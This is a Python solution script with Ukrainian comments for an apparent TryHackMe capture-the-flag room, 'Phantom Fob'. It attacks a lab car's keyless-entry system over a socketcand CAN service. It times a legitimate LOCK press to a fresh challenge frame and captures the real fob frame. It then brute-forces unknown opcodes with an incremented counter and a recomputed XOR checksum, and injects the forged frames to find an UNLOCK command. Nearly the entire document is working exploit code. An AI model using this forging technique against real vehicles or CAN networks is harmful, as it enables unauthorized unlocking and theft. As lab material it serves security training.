#!/usr/bin/env python3

# Скрипт для TryHackMe room Phantom Fob
# Варіант для checksum через XOR.
#
# Ідея:
# 1. Підключаємось до socketcand-like сервісу.
# 2. Чекаємо свіжий challenge frame.
# 3. Одразу натискаємо легальний LOCK через веб.
# 4. Ловимо справжній FOB-фрейм від LOCK.
# 5. Беремо з нього актуальний counter/challenge.
# 6. Перебираємо всі можливі opcode.
# 7. Для кожного opcode перераховуємо checksum через XOR.
# 8. Відправляємо forged-кандидати.

import http.client
import json
import re
import socket
import time

# IP цільової машини.
# ВАЖЛИВО: міняй під свій інстанс.
HOST = "10.130.154.134"

SOCKETCAND_PORT = 29536
WEB_PORT = 8080

# CAN ID, який несе challenge / rolling-дані.
# ВАЖЛИВО: це значення змінюється між інстансами.
CHALLENGE_ID = "318"

# CAN ID фрейму, який відповідає за key fob / кнопки.
# У цьому прикладі з проходження це 504.
FOB_ID = "504"

# Індекси байтів у payload.
#
# Приклад payload:
# B1 43 8A D7 8D 84 BB BD
# b0 b1 b2 b3 b4 b5 b6 b7
#
# За логікою цього інстансу:
# b1 = checksum
# b4 = opcode / кнопка
# b6 = counter
OPCODE_INDEX = 4
COUNTER_INDEX = 6
CHECKSUM_INDEX = 1

# Відомі opcode, які вже відповідають існуючим кнопкам.
# Їх пропускаємо, бо шукаємо невідомий opcode для UNLOCK.
KNOWN_OPCODES = {
    0x8D,  # LOCK
    0xDC,  # HORN
    0x3F,  # IMMOB_ARM
    0x27,  # IMMOB_DISARM
}

# Регулярка для парсингу сирих CAN-фреймів:
# < frame CAN_ID TIMESTAMP PAYLOAD >
FRAME_RE = re.compile(
    rb"<\s*frame\s+([0-9A-Fa-f]+)\s+"
    rb"[0-9.]+\s+([0-9A-Fa-f]+)\s*>"
)


def xor_bytes(data):
    """
    Рахує XOR усіх байтів у data.

    XOR тут використовується як контрольна властивість фрейму.
    Якщо справжній фрейм мав певний загальний XOR, то forged-фрейм
    має зберегти той самий XOR після зміни opcode/counter/checksum.
    """
    value = 0

    for byte in data:
        value ^= byte

    return value


def натиснути_lock():
    """Натискає легальну кнопку LOCK через веб-ендпоінт /press."""
    connection = http.client.HTTPConnection(
        HOST,
        WEB_PORT,
        timeout=3,
    )

    body = json.dumps({"button": "LOCK"})

    connection.request(
        "POST",
        "/press",
        body,
        {"Content-Type": "application/json"},
    )

    response = connection.getresponse()
    data = response.read()
    connection.close()

    print(f"[ВЕБ] Натиснуто LOCK: {data.decode(errors='replace')}")


# Підключаємось до TCP-сервісу CAN.
sock = socket.create_connection(
    (HOST, SOCKETCAND_PORT),
    timeout=10,
)

sock.settimeout(3)

# Отримуємо привітання типу < hi >.
print(sock.recv(256).decode(errors="replace"))

# Відкриваємо can0.
sock.sendall(b"< open can0 >\n")
time.sleep(0.2)

# Вмикаємо rawmode, щоб бачити сирі CAN-фрейми.
sock.sendall(b"< rawmode >\n")
time.sleep(0.2)

buffer = b""
pressed = False
injected = False
started = time.time()

while time.time() - started < 15 and not injected:
    buffer += sock.recv(8192)
    consumed = 0

    for match in FRAME_RE.finditer(buffer):
        can_id = match.group(1).decode().upper()
        payload = bytes.fromhex(match.group(2).decode())
        consumed = match.end()

        # Коли бачимо свіжий challenge frame —
        # одразу натискаємо легальний LOCK.
        #
        # Сенс:
        # challenge/rolling-дані швидко змінюються,
        # тому треба зловити LOCK під актуальний challenge.
        if can_id == CHALLENGE_ID and not pressed:
            print(f"[*] Побачено challenge frame {CHALLENGE_ID}, натискаю LOCK...")
            натиснути_lock()

            pressed = True
            continue

        # Після натискання LOCK чекаємо FOB-фрейм.
        # Це має бути справжній легальний LOCK-фрейм,
        # з якого ми беремо актуальний counter/challenge.
        if can_id == FOB_ID and pressed and len(payload) == 8:
            current_counter = payload[COUNTER_INDEX]
            next_counter = (current_counter + 1) & 0xFF

            # target_xor — це XOR справжнього фрейму.
            # Потім ми будемо підбирати checksum так,
            # щоб forged-фрейм мав такий самий XOR.
            target_xor = xor_bytes(payload)

            print()
            print("[+] Зловлено свіжий FOB-фрейм")
            print(f"    payload:       {' '.join(f'{b:02X}' for b in payload)}")
            print(f"    поточний ctr:  {current_counter:02X}")
            print(f"    наступний ctr: {next_counter:02X}")
            print(f"    target XOR:    {target_xor:02X}")
            print(f"    token bytes:   {payload[5]:02X} {payload[7]:02X}")
            print()

            commands = []

            # Перебираємо всі можливі opcode 00–FF.
            for opcode in range(256):
                # Пропускаємо opcode вже відомих кнопок.
                if opcode in KNOWN_OPCODES:
                    continue

                # Беремо копію справжнього LOCK-фрейму.
                candidate = bytearray(payload)

                # Підставляємо новий opcode-кандидат.
                candidate[OPCODE_INDEX] = opcode

                # Ставимо наступний counter.
                candidate[COUNTER_INDEX] = next_counter

                # Перерахунок checksum через XOR:
                #
                # 1. Тимчасово ставимо checksum = 0.
                # 2. Рахуємо XOR усього candidate.
                # 3. Підбираємо checksum так, щоб загальний XOR
                #    знову став таким, як у справжнього payload.
                #
                # Формула:
                # checksum = target_xor XOR xor_bytes(candidate_with_zero_checksum)
                candidate[CHECKSUM_INDEX] = 0
                candidate[CHECKSUM_INDEX] = (
                    target_xor ^ xor_bytes(candidate)
                )

                data = " ".join(f"{byte:02X}" for byte in candidate)

                command = f"< send {FOB_ID} 8 {data} >\n"
                commands.append(command)

            print(f"[*] Відправляю {len(commands)} forged-кандидатів opcode...")
            sock.sendall("".join(commands).encode("ascii"))

            injected = True
            break

    if consumed:
        buffer = buffer[consumed:]

    # Щоб buffer не ріс нескінченно.
    if len(buffer) > 16384:
        buffer = buffer[-4096:]

time.sleep(1)
sock.close()

if not injected:
    raise SystemExit("[-] Не вдалося зловити свіжий FOB-фрейм")

print("[+] Пачку unlock-кандидатів відправлено")
print("[*] Перевір веб-сторінку, /events або dashboard на locked/flag.")
